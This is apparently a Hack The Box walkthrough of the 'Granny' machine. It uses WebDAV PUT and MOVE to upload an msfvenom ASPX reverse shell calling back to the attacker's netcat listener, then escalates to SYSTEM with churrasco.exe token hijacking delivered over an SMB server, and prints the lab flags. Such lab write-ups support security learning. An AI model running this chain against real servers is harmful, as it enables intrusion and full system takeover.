```bash
Retrieved x-powered-by header: ASP.NET
```
we will know this site could execute ASP files from HTTP header.

# Enumeration
## Enumerate on 80

![[Granny-01.png]]

We will find there is a developing page on this site. We need to dig more pages. 

## Gobuster

```bash
gobuster dir -e -u http://10.10.10.15/ -w /usr/share/wordlists/dirb/big.txt -t 20
```
But we didn't find any useful folders information at this site.

![[Granny-02.png]]
##  WebDAV
Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP. It was originally started in 1996, when this didn’t seem like a terrible idea. I don’t see that often on recent HTB machines, but I did come across it in PWK/OSCP.

From the nmap http-webdav-scan output we know this site HTTP could use  OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH. Which PUT could be used to upload files. MOVE could be used renamed files.

## Davtest
I’ll use `davtest` to explore further, and it will show me what types of files can be uploaded, and if it can create a directory:

```bash
davtest -url http://10.10.10.15
```

![[Granny-03.png]]
Both ASP and ASPX are not allowed. However, TXT and HTML files are.

# Exploitation
Reference:
https://0xdf.gitlab.io/2019/03/06/htb-granny.html

## Upload test file

let's try put txt file to the website. 

```bash
echo 0xdf > test.txt
curl -X PUT http://10.10.10.15/df.txt -d @test.txt
curl http://10.10.10.15/df.txt
```

![[Granny-05.png]]

Cool! we uploaded txt file.

Remember that the PUT HTTP method was not the only method that was allowed. We also can use the MOVE method. The MOVE method not only can be used to change file locations on the web server, but it can also be used to rename files. Let’s try to upload an HTML file on the web server and then rename it to change the extension to an ASPX file.

```bash
curl -X MOVE --header 'Destination:http://10.10.10.15/df.aspx' 'http://10.10.10.15/df.txt'
curl http://10.10.10.15/df.aspx
```

![[Granny-07.png]]

Perfect! Now we have confirmed that we can successfully upload and execute ASPX code on the web server.

## Initial Foothold
we will use msfvenom to create a ASPX reverse shell.

```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.14 LPORT=443 -o shell.aspx
```
Rename the file to _shell.txt_ so that we can upload it on the server.

```bash
mv shell.aspx shell.txt
```

Then upload the file on the web server and change the file extension to ASPX.

```bash
# Binary mode
curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt
# change the file extension
curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt'
```

![[Granny-08.png]]

Next, set up a listener on my attack machine. Execute the _shell.aspx_ file

```bash
nc -vlp 443
curl http://10.10.10.15/shell.aspx
```

![[Granny-09.png]]

Excellent! we get the initial shell. But we can't access the user flag. So we need to do privilege escalation.

![[Granny-10.png]]

# Privilege Escalation
to use windows exploit suggestor , we should run systeminfo and write it into a text.

## 1. systeminfo

```bash
# windows
systeminfo
# kali
mousepad systeminfo.txt
```

### windows exploit suggester
```bash
# we will use windows exploit suggester
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester 
python windows-exploit-suggester.py --update 
# run the check module

![[Granny-12.png]]

we will find MS15-051 didn't work.  It output many of vulnerabilities,  MS15-051 / MS15-010 / MS14-070 / MS14-068 / MS14-064 ...

i tried several of them, but none of them worked.  So we need to check if any other information could be used to do privilege escalation.

## 2. PRIVILEGES INFORMATION

### SeImpersonatePrivilege
let's check this account privilege information.

```bash
whoami /priv
```

![[Granny-13.png]]

cool, SeImpersonatePrivilege is Enabled.

Seeing that we have the SeimpersonatePrivilege enabled on this account is key, as it means we can probably used a method called Token Hijacking. Basically, Server 2003 allows for the NETWORK SERVICE and LOCAL SERVICE accounts to impersonate the SYSTEM account, if this privilege is enabled. 

The well-known exploit for this attack is called churrasco.exe.

https://github.com/Re4son/Churrasco/blob/master/churrasco.exe

### Using smbserver transfer file
```bash
# Launch an SMB server, will allow us to easily get the exe onto the target
sudo impacket-smbserver kali .
```

![[Granny-14.png]]

Download the binary file to local folder. On the target, we need to create the `C:\temp` directory with the below commands. This gives us a writable location to work from.

```cmd
cd C:\
mkdir temp
cd temp
```

we can download the file from the SMB server with:

```bash
copy \\10.10.14.14\kali\churrasco.exe
# run the exploit test
churrasco.exe -d "whoami"
```

![[Granny-15.png]]

Cool, we execute the "whoami" as NT Authority prvilege. Let's create a reverse shell binary file.

```bash
# run the binary as system privilege
churrasco.exe -d "cmd"
```

![[Granny-16.png]]
Sure, we get the NT Authority System Privilege! Let's type root and user flag.

```bash
cd C:\Documents and Settings\Lakis\Desktop
type user.txt
# user flag
700c5dc163014e22b3e408f8703f67d1
```

![[Granny-17.png]]

```bash
cd C:\Documents and Settings\Administrator\Desktop
type root.txt
# flag
aa4beed1c0584445ab463a6747bd06e9
```
